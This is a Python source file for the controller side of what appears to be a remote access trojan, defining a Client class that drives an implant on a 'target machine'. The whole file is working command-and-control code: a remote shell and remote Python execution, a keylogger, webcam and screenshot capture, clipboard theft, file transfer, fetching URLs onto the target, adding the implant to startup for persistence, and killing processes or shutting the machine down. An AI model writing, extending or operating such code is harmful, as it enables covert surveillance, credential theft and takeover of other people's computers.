import json
import logging
import os
from datetime import datetime
from typing import Tuple, Union

from utils.echo import echo
from utils.errors import errors
from utils.esocket import ESocket

_time = lambda: f"{datetime.now()}".replace(':', '-')


class Client():
    """ Client Connection Object """

    def __init__(self, esock: ESocket, address: list) -> None:
        self.esock = esock
        self.address = address

    def disconnect(self) -> None:
        """ Close client connection (allows reconnect) """
        self.esock.close()

    def send_json(self, data: not bytes) -> None:
        """ Send JSON data to Client """
        self.esock.send(json.dumps(data).encode())

    def recv_json(self) -> not bytes:
        """ Receive JSON data from Client """
        _, data = self.esock.recv()
        return json.loads(data.decode())

    def is_frozen(self) -> bool:
        """ Check if the client is frozen (exe) """
        # returns bool
        self.send_json(['FROZEN'])
        return self.recv_json()

    def get_platform(self) -> str:
        """ Get Client Platform """
        # platform.system()
        self.send_json(['PLATFORM'])
        _, platform = self.esock.recv()
        return platform.decode()

    def get_cwd(self) -> str:
        """ Get Client cwd """
        # returns cwd
        self.send_json(['GETCWD'])
        _, cwd = self.esock.recv()
        return cwd.decode()

    def paste(self) -> Tuple[bool, str]:
        """ Get Client Clipboard """
        # returns True/False, clipboard/error
        self.send_json(['PASTE'])
        return tuple(self.recv_json())

    def copy(self, data: str) -> Union[str, None]:
        """ Copy to Client Clipboard"""
        # returns None/error
        self.send_json(['COPY', data])
        return self.recv_json()

    def download(self, url: str, file_name: str) -> Union[str, None]:
        """ Download File To Client """
        # returns None/error
        self.send_json(['DOWNLOAD', url, file_name])
        return self.recv_json()

    def log_path(self) -> str:
        """ Get Log File Name"""
        self.send_json(['LOG_FILE'])
        _, log = self.esock.recv()
        return log.decode()

    def get_log(self, save_as: str = None) -> str:
        """ Transfer log to Server """
        # save_as: file name
        if not save_as:
            save_as = f'{_time()}.log'
        log = self.log_path()
        self.receive_file(log, save_as)
        return save_as

    def restart_session(self) -> None:
        """ Restart Client Session """
        # returns None
        self.send_json(['RESTART_SESSION'])
        self.esock.recv()

    def close(self) -> None:
        """ Stops client on target machine """
        # returns None
        self.send_json(['CLOSE'])
        self.esock.recv()
        self.esock.close()

    def add_startup(self) -> Union[str, None]:
        """ Add Client to Startup """
        # returns None/error
        self.send_json(['ADD_STARTUP'])
        return self.recv_json()

    def remove_startup(self) -> Union[str, None]:
        """ Remove Client from Startup """
        # returns None/error
        self.send_json(['REMOVE_STARTUP'])
        return self.recv_json()

    def lock(self) -> bool:
        """ Lock Client Machine (Windows Only) """
        # returns bool
        self.send_json(['LOCK'])
        return self.recv_json()

    def shutdown(self) -> bool:
        """ Shutdown Client Machine """
        # returns bool
        self.send_json(['SHUTDOWN'])
        return self.recv_json()

    def restart(self) -> bool:
        """ Restart Client Machine """
        # returns bool
        self.send_json(['RESTART'])
        return self.recv_json()

    def send_file(self, file_to_transfer: str, save_as: str, block_size: str = 32768) -> Union[str, None]:
        """ Send file to Client """
        # returns None/error
        try:
            self.send_json(['SEND_FILE', save_as])
            error, error_text = self.esock.recv()
            print(error, error_text)
            if error != '0':
                return error_text.decode()
            with open(file_to_transfer, 'rb') as file:
                while True:
                    block = file.read(block_size)
                    if not block:
                        logging.debug('breaking block')
                        break
                    logging.debug('sending block')
                    self.esock.send(block)

        except (FileNotFoundError, PermissionError) as error:
            logging.debug('some error')
            return errors(error)

        logging.debug('sent file transfer done')
        self.esock.send(b'FILE_TRANSFER_DONE')

    def receive_file(self, file_to_transfer: str, save_as: str) -> Union[str, None]:
        """ Transfer file from Client """
        # returns None/error
        self.send_json(['RECEIVE_FILE', file_to_transfer])
        with open(save_as, 'wb') as file:
            while True:
                error, data = self.esock.recv()
                if error == '9':
                    break
                if error != '0':
                    os.remove(save_as)
                    return data.decode()
                file.write(data)

    def screenshot(self, save_as: str = None) -> Union[str, None]:
        """ Take screenshot on Client """
        # returns None/error
        if not save_as:
            save_as = f'{_time()}.png'
        self.send_json(['SCREENSHOT'])
        error, data = self.esock.recv()
        if error != '0':
            return data
        with open(save_as, 'wb') as file:
            file.write(data)

    def webcam(self, save_as: str = None) -> Union[str, None]:
        """ Capture webcam """
        # returns save_as/None
        if not save_as:
            save_as = f'webcam-{_time()}.png'
        self.send_json(['WEBCAM'])
        error, data = self.esock.recv()
        if error != '0':
            return
        with open(save_as, 'wb') as file:
            file.write(data)
        return save_as

    def exec(self, command: str) -> Tuple[str, Union[str, None]]:
        """ Remote Python Interpreter """
        # returns command_output, error/None
        self.send_json(['EXEC', command])
        return tuple(self.recv_json())

    def shell(self, command: str, _print: bool = True) -> str:
        """ Remote Shell with Client """
        # returns command_output
        system = self.get_platform()
        split_command = command.split(' ')[0].strip().lower()
        if split_command in ['cd', 'chdir']:
            self.send_json(['SHELL', command])
            output = self.recv_json()
            if output[0] == 'ERROR':
                if _print:
                    print(output[1])
                return output[1]
            if system == 'Windows':
                if _print:
                    print()
                return '\n'
            return ''
        if split_command == 'cls' and system == 'Windows':
            os.system('cls')
            return ''
        if split_command == 'clear' and system != 'Windows':
            os.system('clear')
            return ''

        self.send_json(['SHELL', command])
        result = ''
        try:
            while True:
                error, output = self.esock.recv()
                if error != '0':
                    break
                result += f"{output}\n"
                if _print:
                    echo(output)
                self.send_json(['LISTENING'])
        except (EOFError, KeyboardInterrupt):
            self.esock.send(b'QUIT')
        return result

    def start_keylogger(self) -> bool:
        """ Start Keylogger """
        # returns True/False
        self.send_json(['START_KEYLOGGER'])
        return self.recv_json()

    def keylogger_status(self) -> bool:
        """ Get Keylogger Status """
        # returns True/False
        self.send_json(['KEYLOGGER_STATUS'])
        return self.recv_json()

    def stop_keylogger(self) -> bool:
        """ Stop Keylogger """
        # returns True/False
        self.send_json(['STOP_KEYLOGGER'])
        return self.recv_json()

    def get_info(self) -> Tuple[str]:
        """ Get Client Info """

        # returns (
        #     platform.system(),
        #     os.path.expanduser('~'),
        #     getpass.getlogin()
        # )

        self.send_json(['_INFO'])
        return tuple(self.recv_json())

    def info(self, _print: bool = True) -> str:
        """ Get Client Info """
        # returns str
        self.send_json(['INFO'])
        info = self.esock.recv()[1].decode()
        if _print:
            print(info)
        return info

    def ps(self) -> list:
        """ Returns a list of psutil.Process().as_dict() """
        self.send_json(['PS'])
        return self.recv_json()

    def kill(self, pid: int) -> Union[str, None]:
        """ Kill a process by pid on client system """
        self.send_json(['KILL', pid])
        error, response = self.esock.recv()
        if error:
            return response.decode()

    def zip_file(self, zip_filename: str, file_to_zip: str) -> Union[str, None]:
        """ Zip a Single File """
        # returns None/error
        self.send_json(['ZIP_FILE', zip_filename, file_to_zip])
        return self.recv_json()

    def zip_dir(self, zip_filename: str, dir_to_zip: str) -> Union[str, None]:
        """ Zip a Directory """
        # returns None/error
        self.send_json(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip])
        return self.recv_json()

    def unzip(self, zip_filename: str) -> Union[str, None]:
        """ Unzip a File """
        # returns None/error
        self.send_json(['UNZIP', zip_filename])
        return self.recv_json()
